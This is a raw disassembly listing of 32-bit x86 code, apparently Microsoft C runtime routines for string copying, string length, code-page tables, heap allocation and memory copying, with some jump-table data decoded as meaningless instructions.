  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
